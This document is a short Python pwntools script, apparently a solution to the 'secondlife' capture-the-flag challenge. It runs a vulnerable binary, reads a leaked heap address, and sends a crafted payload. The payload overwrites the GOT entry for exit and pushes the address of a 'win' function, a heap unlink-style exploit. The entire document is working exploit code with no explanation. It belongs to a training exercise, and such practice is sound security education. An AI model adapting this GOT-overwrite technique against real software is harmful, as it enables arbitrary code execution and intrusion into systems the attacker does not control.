import os; os.environ["TMPDIR"] = os.path.join(os.environ['HOME'], 'tmp')
import pwn

remote_binary = "/problems/secondlife_6_c4811a8968ff26d298eda578d3b92255/vuln"

def attack():
    pr = pwn.process([remote_binary,'A'], cwd=os.path.dirname(remote_binary))
    try:
        elf = pwn.ELF(remote_binary, False)
        payload = pwn.p32(elf.got["exit"] - 12)

        pr.readline()
        first = int(pr.readline())
        print("first:", first)

        payload += pwn.p32(first + 8)
        payload += pwn.asm("push {};ret;".format(elf.sym["win"]))
        pr.writeline("A")
        pr.writelineafter("an overflow will not be very useful...\n", payload)
        rsp = pr.readall(timeout=0.5)
        print(rsp)
    finally:
        pr.close()

attack()
